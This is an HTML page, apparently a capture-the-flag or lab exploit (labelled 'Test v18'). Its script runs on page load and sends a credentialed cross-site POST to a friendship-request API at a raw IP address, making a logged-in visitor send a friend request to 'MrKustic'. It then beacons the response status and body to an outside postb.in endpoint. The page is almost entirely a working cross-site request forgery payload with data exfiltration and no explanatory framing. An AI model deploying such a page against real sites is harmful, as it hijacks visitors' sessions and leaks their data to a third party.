<!DOCTYPE html>
<html>
<body>
    <script>
        const ENDPOINT = 'https://www.postb.in/1766194528609-0921682694461';
        
        function log(step, data) {
            new Image().src = ENDPOINT + '?step=' + encodeURIComponent(step) + '&data=' + encodeURIComponent(data);
        }
        
        log('START', 'Sending friendship request');
        
        // Простой запрос дружбы с сообщением "123"
        fetch('http://158.160.184.159:13002/api/friendship/request', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type':  'application/json'
            },
            body: JSON.stringify({
                to_user: "MrKustic",
                message: "123"
            })
        })
        .then(response => {
            log('RESPONSE_STATUS', response.status);
            log('RESPONSE_OK', response.ok);
            return response.text();
        })
        .then(text => {
            log('RESPONSE_BODY', text);
            log('SUCCESS', 'Friendship request sent! ');
        })
        .catch(error => {
            log('ERROR', error.toString());
        });
    </script>
    <p>Test v18</p>
</body>
</html>
